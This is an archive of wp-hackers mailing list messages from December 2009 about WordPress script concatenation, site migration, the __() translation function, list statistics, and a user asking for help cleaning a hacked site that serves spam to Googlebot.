On 01.12.2009 22:34, Otto wrote:
> Actually, upon a further reading through the code, I see that it does
> a check such that only scripts in the default directories get handled
> in this manner. These would be the scripts in /wp-admin/js/ and
> /wp-includes/js/ dirs. I didn't know it did that, though I can see
> why...
>
> To get your own scripts to get handled in this way, you'd need to
> modify the $scripts variable. It would look something like this:
>
> function my_scripts_adjuster(&$scripts ) {
> $scripts->default_dirs[] = '/path/from/wp/root/to/my/dir/';
> }
> add_action( 'wp_default_scripts', 'my_scripts_adjuster',20);
>
> I think that would do the trick.
>
> -Otto
> Sent from Memphis, TN, United States
>
>
> On Tue, Dec 1, 2009 at 3:29 PM, Nathan Rice<ncrice at gmail.com>  wrote:
>    
>> Out of curiosity, why aren't scripts minified using load_scripts.php when
>> using wp_enqueue_script in a theme?
>>
>> ------------------
>> Nathan Rice
>> WordPress and Web Development
>> www.nathanrice.net | twitter.com/nathanrice
>>      
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
>    

-- 
Regards,
Oliver Schl?be

http://wpseek.com/
http://wpworldmap.net/


From steph at sillybean.net  Tue Dec  1 21:50:56 2009
From: steph at sillybean.net (Stephanie Leary)
Date: Tue, 01 Dec 2009 21:50:56 +0000
Subject: [wp-hackers] Tips for moving a Wordpress install
In-Reply-To: <4B157D8D.2030209@gmail.com>
References: <d14758810912011220u6d17bb68p4c7fb226125bd89d@mail.gmail.com>
	<4B157D8D.2030209@gmail.com>
Message-ID: <1367434fd0ef9ccd9f1a69f83013f948@laurel.joyent.us>


Harish's instructions are great. There's one other field in the options
table you'll need to edit on the new server: upload_path. (I suppose if
there's something in upload_url_path you'd need to change that, too, but
it's blank in all my installations.)

I take a slightly different approach to the URL problem: I use the Search
and Replace plugin
(http://wordpress.org/extend/plugins/search-and-replace/) and run it on the
content field only. That will leave the serialized options alone, but then
you'd have to figure out which plugins are storing paths and fix them all
by hand (including the string lengths) or just deactivate them and start
over.


Stephanie Leary
sillybean.net

From liste at srpski.biz  Tue Dec  1 21:51:21 2009
From: liste at srpski.biz (=?UTF-8?B?TWlsYW4gRGluacSH?=)
Date: Tue, 1 Dec 2009 22:51:21 +0100
Subject: [wp-hackers] Hook into load-styles.php / load-scripts.php
	"queue"?
In-Reply-To: <862d087f0912011329h2ebe5197v48ddcf7fd31dfec5@mail.gmail.com>
References: <4B15632E.2070002@wpseek.com>
	<8b870c460912011128l213c6d74id919101ec3dcc5c7@mail.gmail.com>
	<4B156FF1.2020200@wpseek.com>
	<eaaa36c90912011216m2396c92doba73d2511ffa3446@mail.gmail.com>
	<4B1584E1.7090108@wpseek.com>
	<161617690912011325j5887a05fl84584b9c03656c6b@mail.gmail.com>
	<862d087f0912011329h2ebe5197v48ddcf7fd31dfec5@mail.gmail.com>
Message-ID: <9b6c20460912011351l7913f9e6oe6097cb3359e06a@mail.gmail.com>

First of all, load-scripts.php is only concatenating already minified
javascript files (at least those included with WP) so that we have fewer
requests per page.

I never really tested this, but I'm not sure if this approach is always good
in WP. For example, some files are only loaded on some pages (see this tip
from Ozh
http://planetozh.com/blog/2008/04/how-to-load-javascript-with-your-wordpress-plugin/).
If all files were always concatenated on each page, we will have
different requests to load-scripts.php so we will again download scripts
that we already downloaded, meaning that concatenation made more damage then
benefit.

As I said, I am not sure how this part of concatenating scripts in admin
works, but it is possible that there are problems described above.

Same applies to frontend too since you can enqueue some scripts in some
cases only. In this case it would get even worse because many more users
will download those files. There are plugins that do minification and
concatenation on frontend, see list here:
http://wordpress.org/support/topic/280624#post-1199931 For them I'm too not
sure what they do in case I described.

Just to clarify that I'm not against concatenation, I actually always use
it, but in WordPress you should carefully use it because it can make more
harm then good.

2009/12/1 Nathan Rice <ncrice at gmail.com>

> Out of curiosity, why aren't scripts minified using load_scripts.php when
> using wp_enqueue_script in a theme?
>
> ------------------
> Nathan Rice
> WordPress and Web Development
> www.nathanrice.net | twitter.com/nathanrice
>
>
> On Tue, Dec 1, 2009 at 4:25 PM, Otto <otto at ottodestruct.com> wrote:
>
> > wp_enqueue_script is the correct way. The minify and compress stuff is
> > automatically handled, if it is enabled.
> >
> > Just enqueue as normal, let WordPress deal with the rest.
> >
> > -Otto
> > Sent from Memphis, TN, United States
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From steve at sltaylor.co.uk  Tue Dec  1 21:51:31 2009
From: steve at sltaylor.co.uk (Steve Taylor)
Date: Tue, 1 Dec 2009 21:51:31 +0000
Subject: [wp-hackers] Hosting Profiles (WAS: Tips for moving a Wordpress
	install)
In-Reply-To: <E5CE7854-6B8F-417C-B2A7-C2B6C4974739@newclarity.net>
References: <d14758810912011220u6d17bb68p4c7fb226125bd89d@mail.gmail.com>
	<161617690912011323i554a1c9cncef83ff20f31fa59@mail.gmail.com>
	<E5CE7854-6B8F-417C-B2A7-C2B6C4974739@newclarity.net>
Message-ID: <a21f8bf00912011351t2a18898w3b61245c99a28f6f@mail.gmail.com>

> This could solve a problem that far too many people experience and make WordPress more accessible for serious use.

I don't feel able to assess the proposed solution, but I'll second the
general idea. I'm dealing with more WP clients where a dev > staging >
production set up is mandatory. The little niggles that are just
niggles on a small scale become unwieldy when moving around happens
more often, and server operations outside dev are done by tech staff
who may not know WP very well (or at all).

I've tried to do things like make sure the URLs are dev.*, stg.* and
www.*, so in theory there's little or no problems where full URLs are
stored in serialized arrays. But while there may always be plugins
that reduce portability for various reasons, it'd be great if the WP
core was pushed towards greater portability, and at least making
plugin portability easy / easier to acheive.

Steve

From admin at laptoptips.ca  Tue Dec  1 21:52:50 2009
From: admin at laptoptips.ca (Andrew Ozz)
Date: Tue, 01 Dec 2009 13:52:50 -0800
Subject: [wp-hackers] Hook into load-styles.php /
	load-scripts.php	"queue"?
In-Reply-To: <161617690912011334q52e84294v21f526b533745d2@mail.gmail.com>
References: <4B15632E.2070002@wpseek.com>	<8b870c460912011128l213c6d74id919101ec3dcc5c7@mail.gmail.com>
	<4B156FF1.2020200@wpseek.com>	<eaaa36c90912011216m2396c92doba73d2511ffa3446@mail.gmail.com>
	<4B1584E1.7090108@wpseek.com>	<161617690912011325j5887a05fl84584b9c03656c6b@mail.gmail.com>
	<862d087f0912011329h2ebe5197v48ddcf7fd31dfec5@mail.gmail.com>
	<161617690912011334q52e84294v21f526b533745d2@mail.gmail.com>
Message-ID: <4B159032.7060707@laptoptips.ca>

Otto wrote:
> Actually, upon a further reading through the code, I see that it does
> a check such that only scripts in the default directories get handled
> in this manner. These would be the scripts in /wp-admin/js/ and
> /wp-includes/js/ dirs. I didn't know it did that, though I can see
> why...

Both load-styles.php and load-scripts.php can only process default 
scripts and stylesheets as they don't load the rest of WordPress. The 
URLs are taken from script-loader.php where they are hard-coded.

Otherwise we would need to load WordPress at least three times for every 
page: once for the html, once for js and once for css...

There are other ways to do concatenating of all scripts and styles 
including the queue from plugins but it involves saving the ready files 
to the server similar to how WP Super Cache works, so not a good idea 
for core as it needs proper server config, etc.

I actually have some code to do this that's been sitting around for a 
while due to lack of time, if somebody wants to team up we could make it 
into a plugin :)

From ghodmode at ghodmode.com  Wed Dec  2 08:49:06 2009
From: ghodmode at ghodmode.com (Ghodmode)
Date: Wed, 02 Dec 2009 21:49:06 +1300
Subject: [wp-hackers] WP-Hackers Stats for December 2009
In-Reply-To: <4B14E639.9040702@schestowitz.com>
References: <4B14E639.9040702@schestowitz.com>
Message-ID: <1259743746.3614.1.camel@home>

That's pretty cool.  It's kind of like a video game.  I wonder which
list I should try to get on for next month :) ...

On Tue, 2009-12-01 at 09:47 +0000, Roy Schestowitz wrote:
> ?  Times are Greenwich Mean Time (GMT) +0:00
> 
>   ?  Statistics span a period of one month
> 
>   ?  Subject line formatted consistently "WP-Hackers Stats for <MONTH>
> <YEAR>"
> 
>   ?  Killfile <subject contains "WP-Hackers Stats for "> if uninterested
> ____________________________________________________________
> 
> Stats for wp-hackers
> ~~~~~~~~~~~~~~~~~~~~
> ***** People who have written most messages:
> +----+-----Author-----------------------------------+--Msg-+-Percent-+
> |  1 | scribu gmail.com                             |   54 |  9.89 % |
> |  2 | otto ottodestruct.com                        |   45 |  8.24 % |
> |  3 | mikeschinkel newclarity.net                  |   30 |  5.49 % |
> |  4 | wp xentek.net                                |   22 |  4.03 % |
> |  5 | Ken adcSTUDIO.com                            |   17 |  3.11 % |
> |  6 | william.canino googlemail.com                |   15 |  2.75 % |
> |  7 | wordpress dd32.id.au                         |   15 |  2.75 % |
> |  8 | wordpress santosj.name                       |   14 |  2.56 % |
> |  9 | peter.westwood ftwr.co.uk                    |   12 |  2.20 % |
> | 10 | kkarpieszuk gmail.com                        |   12 |  2.20 % |
> | 11 | jer simianuprising.com                       |   12 |  2.20 % |
> | 12 | dave technicacreative.co.uk                  |   10 |  1.83 % |
> | 13 | pete jointforcestech.com                     |   10 |  1.83 % |
> | 14 | steve sltaylor.co.uk                         |    9 |  1.65 % |
> | 15 | mark watero.us                               |    9 |  1.65 % |
> | 16 | anacin gwhatchet.com                         |    9 |  1.65 % |
> | 17 | matt mattjacob.com                           |    8 |  1.47 % |
> | 18 | wp-hackers striderweb.com                    |    8 |  1.47 % |
> | 19 | tunamaxx yahoo.com                           |    7 |  1.28 % |
> | 20 | photofantaisie gmail.com                     |    7 |  1.28 % |
> | 21 | autremonde75 gmail.com                       |    6 |  1.10 % |
> | 22 | cclarkson htcomp.net                         |    6 |  1.10 % |
> | 23 | gaarai gaarai.com                            |    6 |  1.10 % |
> | 24 | lynne.pope gmail.com                         |    5 |  0.92 % |
> | 25 | glenn glennansley.com                        |    5 |  0.92 % |
> +----+----------------------------------------------+------+---------+
> |    | other                                        |  193 | 35.35 % |
> +----+----------------------------------------------+------+---------+
> 
> ***** Best authors, by total size of their messages (w/o quoting):
> +----+-----Author-------------------------------------------+-KBytes-+
> |  1 | otto ottodestruct.com                                |   45.5 |
> |  2 | mikeschinkel newclarity.net                          |   39.6 |
> |  3 | wordpress santosj.name                               |   32.4 |
> |  4 | scribu gmail.com                                     |   28.0 |
> |  5 | mccormicky gmail.com                                 |   13.9 |
> |  6 | wordpress dd32.id.au                                 |   13.4 |
> |  7 | wp xentek.net                                        |   12.5 |
> |  8 | kkarpieszuk gmail.com                                |   11.7 |
> |  9 | william.canino googlemail.com                        |   11.4 |
> | 10 | golunski onet.eu                                     |   11.2 |
> | 11 | cclarkson htcomp.net                                 |   10.5 |
> | 12 | jer simianuprising.com                               |    9.7 |
> | 13 | Ken adcSTUDIO.com                                    |    9.6 |
> | 14 | mark watero.us                                       |    9.3 |
> | 15 | steve sltaylor.co.uk                                 |    8.2 |
> | 16 | contato catiakitahara.com.br                         |    7.7 |
> | 17 | peter.westwood ftwr.co.uk                            |    7.7 |
> | 18 | tunamaxx yahoo.com                                   |    6.7 |
> | 19 | russgilbert gmail.com                                |    6.0 |
> | 20 | wp-hackers striderweb.com                            |    5.9 |
> | 21 | matt mattjacob.com                                   |    5.5 |
> | 22 | gaarai gaarai.com                                    |    5.3 |
> | 23 | beau dentedreality.com.au                            |    5.0 |
> | 24 | autremonde75 gmail.com                               |    4.4 |
> | 25 | photofantaisie gmail.com                             |    4.4 |
> +----+------------------------------------------------------+--------+
> 
> ***** Best authors, by average size of their message (w/o quoting):
> +----+-----Author--------------------------------------------+-bytes-+
> |  1 | golunski onet.eu                                      | 11464 |
> |  2 | mccormicky gmail.com                                  |  4753 |
> |  3 | contato catiakitahara.com.br                          |  2644 |
> |  4 | wordpress santosj.name                                |  2371 |
> |  5 | markjaquith gmail.com                                 |  2332 |
> |  6 | jason realestatetomato.com                            |  2174 |
> |  7 | liste srpski.biz                                      |  1918 |
> |  8 | cclarkson htcomp.net                                  |  1789 |
> |  9 | beau dentedreality.com.au                             |  1717 |
> | 10 | raven mecus.es                                        |  1708 |
> | 11 | shane bugssite.org                                    |  1555 |
> | 12 | patrik.bona mrhead.sk                                 |  1510 |
> | 13 | john aldenta.com                                      |  1476 |
> | 14 | mrbrog gmail.com                                      |  1453 |
> | 15 | xrdawson gmail.com                                    |  1382 |
> | 16 | burobjorn gmail.com                                   |  1378 |
> | 17 | mikeschinkel newclarity.net                           |  1352 |
> | 18 | russgilbert gmail.com                                 |  1234 |
> | 19 | erisds gmail.com                                      |  1234 |
> | 20 | hn sacharis.no                                        |  1207 |
> | 21 | celeph gmail.com                                      |  1155 |
> | 22 | cdunde1 tampabay.rr.com                               |  1127 |
> | 23 | malaiac gmail.com                                     |  1095 |
> | 24 | jordi jcanals.cat                                     |  1077 |
> | 25 | mark watero.us                                        |  1053 |
> +----+-------------------------------------------------------+-------+
> 
> ***** Table showing the most successful subjects:
> +----+----Subject-----------------------------------+--Msg-+-Percent-+
> |  1 | [wp-hackers] WordPress <= 2.8.5 Unrestricted |   35 |  6.41 % |
> |  2 | [wp-hackers] Options for Controller - Views  |   27 |  4.95 % |
> |  3 | [wp-hackers] "deprecating" direct calls to w |   24 |  4.40 % |
> |  4 | [wp-hackers] Username Madness                |   21 |  3.85 % |
> |  5 | [wp-hackers] Not willing to summon the ancie |   19 |  3.48 % |
> |  6 | [wp-hackers] This was painful to read...     |   19 |  3.48 % |
> |  7 | [wp-hackers] Plugins and themes localization |   18 |  3.30 % |
> |  8 | [wp-hackers] plugin compatability            |   16 |  2.93 % |
> |  9 | [wp-hackers] Best practice way for a plugin  |   16 |  2.93 % |
> | 10 | [wp-hackers] some problem with javascript in |   14 |  2.56 % |
> | 11 | [wp-hackers] Sidebar ID Naming Problems      |   14 |  2.56 % |
> | 12 | [wp-hackers] The problem with WP_Rewrite <<< |   14 |  2.56 % |
> | 13 | [wp-hackers] Delete Plugin on SVN please     |   13 |  2.38 % |
> | 14 | [wp-hackers] Feed caching                    |   13 |  2.38 % |
> | 15 | [wp-hackers] A Humble Request                |   12 |  2.20 % |
> | 16 | [wp-hackers] Putting post into /blog/        |   11 |  2.01 % |
> | 17 | [wp-hackers] Handling cookies with wp-plugin |   10 |  1.83 % |
> | 18 | [wp-hackers] WordPress <= 2.8.5 Unrestricted |   10 |  1.83 % |
> | 19 | [wp-hackers] SEO,                            |   10 |  1.83 % |
> | 20 | [wp-hackers] Adding an output buffer callbac |    9 |  1.65 % |
> | 21 | [wp-hackers] no 'before' or 'after' paramete |    9 |  1.65 % |
> | 22 | [wp-hackers] custom Edit Pages screens       |    8 |  1.47 % |
> | 23 | [wp-hackers] How to number the paged comment |    8 |  1.47 % |
> | 24 | [wp-hackers] WP as a CMS with a touch of Blo |    8 |  1.47 % |
> | 25 | [wp-hackers] Uploading image attachments fro |    7 |  1.28 % |
> +----+----------------------------------------------+------+---------+
> |    | other                                        |  181 | 33.15 % |
> +----+----------------------------------------------+------+---------+
> 
> ***** Most used email clients:
> +----+----Mailer------------------------------------+--Msg-+-Percent-+
> |  1 | Google Mail/Other                            |  311 | 56.96 % |
> |  2 | Apple Mail (2.936)                           |   40 |  7.33 % |
> |  3 | Apple Mail (2.1077)                          |   33 |  6.04 % |
> |  4 | Thunderbird 2.0.0.23 (Windows/20090812)      |   30 |  5.49 % |
> |  5 | Apple Mail (2.1076)                          |   21 |  3.85 % |
> |  6 | Mozilla/5.x                                  |   21 |  3.85 % |
> |  7 | Microsoft Office Outlook 12.0                |   14 |  2.56 % |
> |  8 | Thunderbird 2.0.0.23 (X11/20090817)          |   12 |  2.20 % |
> |  9 | Opera Mail/10.10 (Win32)                     |    9 |  1.65 % |
> | 10 | G2/1.0                                       |    7 |  1.28 % |
> | 11 | YahooMailClassic/8.1.6 YahooMailWebService/0 |    5 |  0.92 % |
> | 12 | Opera Mail/10.20 (Win32)                     |    5 |  0.92 % |
> | 13 | Evolution 2.26.1                             |    4 |  0.73 % |
> | 14 | Apple Mail (2.935.3)                         |    4 |  0.73 % |
> | 15 | Opera Mail/10.01 (Win32)                     |    3 |  0.55 % |
> | 16 | Evolution 2.28.1                             |    3 |  0.55 % |
> | 17 | Microsoft Outlook Express 6.x                |    3 |  0.55 % |
> | 18 | Industrious bit-pushing elves                |    3 |  0.55 % |
> | 19 | Lotus Notes Release 7.0                      |    2 |  0.37 % |
> | 20 | Evolution 2.22.3.1                           |    2 |  0.37 % |
> | 21 | iPhone Mail (7D11)                           |    2 |  0.37 % |
> | 22 | YahooMailClassic/8.1.6 YahooMailWebService/0 |    2 |  0.37 % |
> | 23 | Microsoft Outlook IMO                        |    2 |  0.37 % |
> | 24 | Forte Agent 5.0x                             |    2 |  0.37 % |
> | 25 | Thunderbird 2.0.0.23 (Macintosh/20090812)    |    2 |  0.37 % |
> +----+----------------------------------------------+------+---------+
> |    | other                                        |    4 |  0.73 % |
> +----+----------------------------------------------+------+---------+
> 
> ***** Table of maximal quoting:
> +----+-----Author------------------------------------------+-Percent-+
> |  1 | donncha linux.ie                                    | 86.44 % |
> |  2 | feeds armeda.com                                    | 84.34 % |
> |  3 | trelvao workmedia.pt                                | 83.66 % |
> |  4 | marvinc gmail.com                                   | 83.38 % |
> |  5 | pete jointforcestech.com                            | 78.55 % |
> |  6 | celeph gmail.com                                    | 76.14 % |
> |  7 | dave technicacreative.co.uk                         | 74.68 % |
> |  8 | shinji elite-systems.org                            | 74.32 % |
> |  9 | ceo kettlewell.net                                  | 73.18 % |
> | 10 | bryanharley gmail.com                               | 71.91 % |
> | 11 | spencer.gurnk gmail.com                             | 70.00 % |
> | 12 | leogermani gmail.com                                | 69.65 % |
> | 13 | kontakt joernroeder.de                              | 69.06 % |
> | 14 | lew fullthrottledevelopment.com                     | 66.15 % |
> | 15 | joost yoast.com                                     | 65.28 % |
> | 16 | navjotjsingh gmail.com                              | 64.49 % |
> | 17 | dan phiffer.org                                     | 64.40 % |
> | 18 | mgerring emrl.com                                   | 61.80 % |
> | 19 | office wpseek.com                                   | 60.72 % |
> | 20 | gaarai gaarai.com                                   | 58.57 % |
> | 21 | SuperMoonMan gmail.com                              | 57.93 % |
> | 22 | johnbillion+wp gmail.com                            | 54.45 % |
> | 23 | tim silentgap.com                                   | 53.55 % |
> | 24 | ryan boren.nu                                       | 53.30 % |
> | 25 | markandrewslade gmail.com                           | 52.65 % |
> +----+-----------------------------------------------------+---------+
> |    | average                                             | 42.52 % |
> +----+-----------------------------------------------------+---------+
> 
> ***** Graph showing number of messages written during hours of day:
> 
> 100% ---------------------------#--------------------- - 44
>  90% -----------------------#---#-----#-#------------- msgs
>  80% -----------------------#---#-#---#-#-------------
>  70% ---------------------#-#-#-#-#-#-#-#-------------
>  60% -------------------#-#-#-#-#-#-#-#-#-----#-------
>  50% -----------------#-#-#-#-#-#-#-#-#-#-#---#-#-----
>  40% -#-#-------------#-#-#-#-#-#-#-#-#-#-#-#-#-#-----
>  30% -#-#-------------#-#-#-#-#-#-#-#-#-#-#-#-#-#---#-
>  20% -#-#-#---------#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-
>  10% -#-#-#---#-----#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-
>       * * * * * * * * * * * * * * * * * * * * * * * *
> hour  0         5           11          17          23
> 
> 
> ***** Graph showing number of messages written during days of month:
> 
> 100% ---------------------#----------------------------------------- - 39
>  90% -----#---------------#-#---------------#----------------------- msgs
>  80% -----#---#-----------#-#-------------#-#---------------#-------
>  70% -----#---#-----------#-#-----------#-#-#---------------#-------
>  60% -----#---#-----------#-#---------#-#-#-#---------------#---#---
>  50% -----#-#-#-----------#-#-------#-#-#-#-#---------------#---#---
>  40% -#-#-#-#-#-----------#-#-#-----#-#-#-#-#-------------#-#-#-#---
>  30% -#-#-#-#-#---------#-#-#-#-----#-#-#-#-#-------------#-#-#-#---
>  20% -#-#-#-#-#-----#-#-#-#-#-#-----#-#-#-#-#-#-#-#-----#-#-#-#-#---
>  10% -#-#-#-#-#-#---#-#-#-#-#-#-#---#-#-#-#-#-#-#-#-#-#-#-#-#-#-#---
>       * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
>  day  1         6           12          18          24            31
> 
> 
> ***** Graph showing number of messages written during days of week:
> 
> 100% -------------#--------------- - 111
>  90% -------------#--------------- msgs
>  80% ---------#---#---------------
>  70% -#---#---#---#---------------
>  60% -#---#---#---#---#-----------
>  50% -#---#---#---#---#-----------
>  40% -#---#---#---#---#---#---#---
>  30% -#---#---#---#---#---#---#---
>  20% -#---#---#---#---#---#---#---
>  10% -#---#---#---#---#---#---#---
>       *   *   *   *   *   *   *
>      Mon Tue Wed Thu Fri Sat Sun
> 
> 
> ***** Maximal quoting:
>       Author     : pete jointforcestech.com
>       Subject    : [wp-hackers] WordPress <= 2.8.5 Unrestricted File Upload
>       Date       : Thu, 12 Nov 2009 13:30:11 -0800
>       Quote ratio: 94.90% / 5486 bytes
> 
> ***** Longest message:
>       Author     : golunski onet.eu
>       Subject    : [wp-hackers] WordPress <= 2.8.5 Unrestricted File
> Upload Arbitrary
>       Date       : Wed, 11 Nov 2009 17:08:04 +0000
>       Size       : 11507 bytes
> 
> ***** Most successful subject:
>       Subject    : [wp-hackers] WordPress <= 2.8.5 Unrestricted File Upload
>       No. of msgs: 35
>       Total size : 66709 bytes
> 
> ***** Final summary:
>       Total number of messages:             546
>       Total number of different authors:    116
>       Total number of different subjects:   86
>       Total size of messages (w/o headers): 838979 bytes
>       Average size of a message:            1536 bytes
> 
> ***** Generated by MailListStat v1.3, (C) 2001-2003 <marki (at) nexin.sk>
> ***** See http://freshmeat.net/projects/mls for details...
> 
> DISCLAIMER: Stats automatically produced. Remember that stats are often
> meaningless and deceiving.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From ghodmode at ghodmode.com  Wed Dec  2 08:57:15 2009
From: ghodmode at ghodmode.com (Ghodmode)
Date: Wed, 02 Dec 2009 21:57:15 +1300
Subject: [wp-hackers] two-underscore function arguments?
Message-ID: <1259744235.3614.7.camel@home>

What's the syntax of the __() function?  Can someone send me a link to
the documentation that explains it?

I'm looking through the code of an existing WP plugin and I hope to be
able to change it to meet my needs.  I've seen the __() function for the
first time and I'm wondering exactly how it works.  Here's an example:

__('Duration', 'wpevents')

Searching the web tells me it has something to do with translation, but
all of the examples I've seen only have one argument.  What's that
second argument?

Thank you.

-- 
Ghodmode
http://www.ghodmode.com


From me at anthony.geek.nz  Wed Dec  2 09:02:22 2009
From: me at anthony.geek.nz (Anthony Cole)
Date: Wed, 2 Dec 2009 22:02:22 +1300
Subject: [wp-hackers] two-underscore function arguments?
In-Reply-To: <1259744235.3614.7.camel@home>
References: <1259744235.3614.7.camel@home>
Message-ID: <AB85CB6D-C362-4E6C-A3D2-8375951FE9C5@anthony.geek.nz>

It's to do with i18n and internationalization. 

-Anthony

On 2/12/2009, at 9:57 PM, Ghodmode wrote:

> What's the syntax of the __() function?  Can someone send me a link to
> the documentation that explains it?
> 
> I'm looking through the code of an existing WP plugin and I hope to be
> able to change it to meet my needs.  I've seen the __() function for the
> first time and I'm wondering exactly how it works.  Here's an example:
> 
> __('Duration', 'wpevents')
> 
> Searching the web tells me it has something to do with translation, but
> all of the examples I've seen only have one argument.  What's that
> second argument?
> 
> Thank you.
> 
> -- 
> Ghodmode
> http://www.ghodmode.com
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From kers at atdt.nu  Wed Dec  2 09:02:50 2009
From: kers at atdt.nu (Christian Bolstad)
Date: Wed, 2 Dec 2009 10:02:50 +0100
Subject: [wp-hackers] two-underscore function arguments?
In-Reply-To: <1259744235.3614.7.camel@home>
References: <1259744235.3614.7.camel@home>
Message-ID: <281d596d0912020102l163ba963u9c4f490d3e22347@mail.gmail.com>

On Wed, Dec 2, 2009 at 9:57 AM, Ghodmode <ghodmode at ghodmode.com> wrote:

> What's the syntax of the __() function?  Can someone send me a link to
> the documentation that explains it?
>

The documentation for the function can be found at
http://codex.wordpress.org/Function_Reference/_2 - also look at
http://codex.wordpress.org/Translating_WordPress to get more insights on the
gettext-mechanism behind it.



> I'm looking through the code of an existing WP plugin and I hope to be
> able to change it to meet my needs.  I've seen the __() function for the
> first time and I'm wondering exactly how it works.  Here's an example:
>
> __('Duration', 'wpevents')
>
> Searching the web tells me it has something to do with translation, but
> all of the examples I've seen only have one argument.  What's that
> second argument?
>
> Thank you.
>
> --
> Ghodmode
> http://www.ghodmode.com
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Christian Bolstad: 0700-624351 | christian at bolstad.se | ICQ: 277707 | MSN:
cb at live.se
Box 937, 11479 Stockholm.  Bes?ksadress: Kaplansbacken 5, Stockholm

From malaiac at gmail.com  Wed Dec  2 09:07:18 2009
From: malaiac at gmail.com (Malaiac)
Date: Wed, 2 Dec 2009 10:07:18 +0100
Subject: [wp-hackers] WP exploit ,
	was Re: [Webmaster Central Help] Site hacked.
Message-ID: <59e7f3130912020107t61ea9ba8nb67ecdff711f3aac@mail.gmail.com>

2009/11/27 Malaiac <malaiac at gmail.com>:
> Regarding http://www.google.com/support/forum/p/Webmasters/thread?fid=2bb823d5af6173a00004794fff8f89b7&hl=en
>
> it seems this is an exploit from older versions of WP.
>
> One of my sites had been hacked with it. Upgrading to 2.8.6 and
> overwriting the wp-settings.php file did the job.

Oops.
upgrading to 2.8.6 only fixed the problem for a few days before the
hacker went on it again.

See the actual hacking on
http://www.google.fr/search?rlz=1C1CHMP_frFR291FR301&sourceid=chrome&ie=UTF-8&q=site:lestelechargements.fr
Front page is ok when viewed with a human user agent, but just check
the front page with a Googlebot user agent and you'll get the
prescription.

wp-settings.php is clean, as are  .htaccess and index.php

Another subdomain setup on the same domain (
http://musique.lestelechargements.fr/ ) is fine.

Any idea where to search for the exploit ?

M

From ghodmode at ghodmode.com  Wed Dec  2 09:10:20 2009
From: ghodmode at ghodmode.com (Ghodmode)
Date: Wed, 02 Dec 2009 22:10:20 +1300
Subject: [wp-hackers] two-underscore function arguments?
In-Reply-To: <281d596d0912020102l163ba963u9c4f490d3e22347@mail.gmail.com>
References: <1259744235.3614.7.camel@home>
	<281d596d0912020102l163ba963u9c4f490d3e22347@mail.gmail.com>
Message-ID: <1259745020.3614.11.camel@home>

Wow!  You guys are fast!  :)

On Wed, 2009-12-02 at 10:02 +0100, Christian Bolstad wrote:
> On Wed, Dec 2, 2009 at 9:57 AM, Ghodmode <ghodmode at ghodmode.com> wrote:
> 
> > What's the syntax of the __() function?  Can someone send me a link to
> > the documentation that explains it?
> >
> 
> The documentation for the function can be found at
> http://codex.wordpress.org/Function_Reference/_2 - also look at
> http://codex.wordpress.org/Translating_WordPress to get more insights on the
> gettext-mechanism behind it.

That's exactly what I was looking for, but I also found something else
after I sent the email...
http://codex.wordpress.org/I18n_for_WordPress_Developers#Choosing_and_loading_a_domain

Thank you.


> > I'm looking through the code of an existing WP plugin and I hope to be
> > able to change it to meet my needs.  I've seen the __() function for the
> > first time and I'm wondering exactly how it works.  Here's an example:
> >
> > __('Duration', 'wpevents')
> >
> > Searching the web tells me it has something to do with translation, but
> > all of the examples I've seen only have one argument.  What's that
> > second argument?
> >
> > Thank you.
> >
> > --
> > Ghodmode
> > http://www.ghodmode.com
> >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> 
> 
> 


From malaiac at gmail.com  Wed Dec  2 09:10:42 2009
From: malaiac at gmail.com (Malaiac)
Date: Wed, 2 Dec 2009 10:10:42 +0100
Subject: [wp-hackers] WP exploit ,
	was Re: [Webmaster Central Help] Site hacked.
In-Reply-To: <59e7f3130912020107t61ea9ba8nb67ecdff711f3aac@mail.gmail.com>
References: <59e7f3130912020107t61ea9ba8nb67ecdff711f3aac@mail.gmail.com>
Message-ID: <59e7f3130912020110j1a552c71qda36003af8a98212@mail.gmail.com>

2009/12/2 Malaiac <malaiac at gmail.com>:
> 2009/11/27 Ma
> See the actual hacking on
> http://www.google.fr/search?rlz=1C1CHMP_frFR291FR301&sourceid=chrome&ie=UTF-8&q=site:lestelechargements.fr
> Front page is ok when viewed with a human user agent, but just check the front page with a Googlebot user agent and you'll get the prescription.

I just uploaded an index.htm to make sure front page is not cialis
generated for Google, so you won't be able to see the spam on the site
(but it's still in the Google cache)

From wordpress at zed1.com  Wed Dec  2 09:29:06 2009
From: wordpress at zed1.com (Mike Little)
Date: Wed, 2 Dec 2009 09:29:06 +0000
Subject: [wp-hackers] WP exploit ,
	was Re: [Webmaster Central Help] Site 	hacked.
In-Reply-To: <59e7f3130912020107t61ea9ba8nb67ecdff711f3aac@mail.gmail.com>
References: <59e7f3130912020107t61ea9ba8nb67ecdff711f3aac@mail.gmail.com>
Message-ID: <7235ce780912020129n31b10fabq2f2757844c616d21@mail.gmail.com>

2009/12/2 Malaiac <malaiac at gmail.com>

> 2009/11/27 Malaiac <malaiac at gmail.com>:
> > Regarding
> http://www.google.com/support/forum/p/Webmasters/thread?fid=2bb823d5af6173a00004794fff8f89b7&hl=en
> >
> > it seems this is an exploit from older versions of WP.
> >
> > One of my sites had been hacked with it. Upgrading to 2.8.6 and
> > overwriting the wp-settings.php file did the job.
>
> Oops.
> upgrading to 2.8.6 only fixed the problem for a few days before the
> hacker went on it again.
>
>
>
Look for files which are not part of WordPress and remove them. They often
have wp sounding names but contain complete cracker control panels that can
edit files, create new files, and modify your database all under automated
remote control! Once those are there, upgrading wp doesn't make them go
away.

